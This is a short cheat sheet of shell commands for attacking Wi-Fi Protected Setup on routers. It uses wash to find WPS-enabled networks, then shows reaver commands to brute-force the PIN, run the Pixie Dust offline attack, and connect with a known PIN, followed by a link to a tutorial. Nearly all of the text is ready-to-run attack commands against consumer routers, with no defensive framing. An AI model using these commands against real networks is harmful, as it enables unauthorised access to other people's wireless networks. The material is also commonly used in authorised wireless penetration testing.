
#check for networks with wps available
wash -i wlan0mon

#OUTPUT

BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
AA:BB:CC:XX:YY:ZZ    1  -88  2.0  No   Broadcom  linksys

#ATTACKS TO RETRIEVE THE PIN

#standard attack
sudo reaver  -i wlan0mon -b AA:BB:CC:XX:YY:ZZ -v

#pixie dust offline attack - (-K 1)
sudo reaver -i wlan0mon -b AA:BB:CC:XX:YY:ZZ -vvv -K 1

#pin grabbed from the back of the router
sudo reaver -b AA:BB:CC:XX:YY:ZZ -i wlan0 -vv -p 12345678




















https://axcheron.github.io/hacking-wps-using-reaver-and-pixie-dust-attack/
